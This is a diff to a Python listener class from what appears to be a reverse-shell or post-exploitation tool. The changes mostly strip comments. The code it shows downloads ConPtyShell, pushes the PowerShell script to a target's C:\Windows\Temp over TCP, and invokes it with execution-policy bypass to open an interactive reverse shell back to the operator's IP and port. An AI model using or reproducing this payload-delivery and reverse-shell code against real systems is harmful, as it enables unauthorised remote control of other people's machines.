@@ -417,7 +417,6 @@ class Listener:
         if local_ip in ("0.0.0.0", ""):
             local_ip = "127.0.0.1"
 
-        # Download ConPtyShell locally, then push it to the target via TCP.
         with Spinner("Fetching ConPtyShell locally…"):
             try:
                 with urllib.request.urlopen(self._CONPTYSHELL_URL, timeout=15) as resp:
@@ -426,10 +425,6 @@ class Listener:
                 notify('error', f"Failed to fetch ConPtyShell: {exc}")
                 return
 
-        # Step 2: upload the PS1 to the target via TCP.
-        # The upload command is sent DIRECTLY to the PS session (no outer
-        # `powershell -c "..."` wrapper) so that PowerShell does not expand
-        # $_c/$_f/$_b/$_n to empty strings before the subprocess sees them.
         remote_path = r"C:\Windows\Temp\Invoke-ConPtyShell.ps1"
         upload_port, upload_thread, upload_errors = spawn_send_server(ps1_data, timeout=15)
 
@@ -451,10 +446,8 @@ class Listener:
             return
 
         notify('info', f"ConPtyShell uploaded → {remote_path}")
-        time.sleep(1.0)  # let remote PS finish writing before we invoke
+        time.sleep(1.0)
 
-        # Step 3: dot-source and invoke. No $-variables in this string,
-        # so no expansion issue when PS evaluates the outer quotes.
         invoke_cmd = (
             f"powershell -nop -ep bypass -c \". '{remote_path}';"
             f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
@@ -657,7 +650,7 @@ class Listener:
             return
 
         old = sess.os_label()
-        sess.os_type = os_type  # type: ignore[assignment]
+        sess.os_type = os_type
 
         if os_type == "linux":
             sess.encoding = "utf-8"
